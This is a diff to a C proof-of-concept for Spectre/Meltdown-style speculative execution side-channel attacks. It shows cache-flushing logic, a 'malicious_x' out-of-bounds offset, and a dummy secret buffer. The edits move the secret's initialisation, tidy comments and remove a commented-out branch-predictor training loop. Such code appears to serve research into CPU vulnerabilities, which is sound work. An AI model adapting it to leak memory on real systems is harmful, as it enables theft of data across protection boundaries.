@@ -4,13 +4,9 @@
 #include <stdint.h>
 #include <time.h>
 #include <fcntl.h>
-
 #include <assert.h>
-
 #include <unistd.h>
-
 #include <sys/mman.h>
-
 #include <x86intrin.h>
 
 char secret[100];
@@ -28,9 +24,10 @@ volatile Array *scratchpad;
 // used for branch predictor
 volatile Array *temp_scratchpad;
 
-// memory!
+// where to access!
 volatile int *branch_variable;
 
+// Size of the array on its own page
 volatile int size[0x10000];
 volatile int *array_size;
 
@@ -50,6 +47,7 @@ alloc_memory() {
     branch_variable = mmap_size(0x1000);
     size[0] = 0x1000;
     array_size = &size[0];
+    memset(secret, 97, 100);
 }
 
 
@@ -57,7 +55,6 @@ alloc_memory() {
 int meltdown_logic(int *branch_variable,
                     Array *cachepad) {
     volatile int i = 0;
-    memset(secret, 97, 100);
 
     for (int j = 0; j < 100; j++) {
 	volatile char k = secret[j];
@@ -130,12 +127,6 @@ spectre() {
     for (int i = 0; i < 64; i++) {
         usleep(1000);
 
-	/*
-        *branch_variable = 0;
-        for (int j; j < 1000000; j++) {
-            meltdown_logic(branch_variable, temp_scratchpad);
-	}
-       	*/
         flush_all();
 
 	volatile int malicious_x = (secret - some_array);	
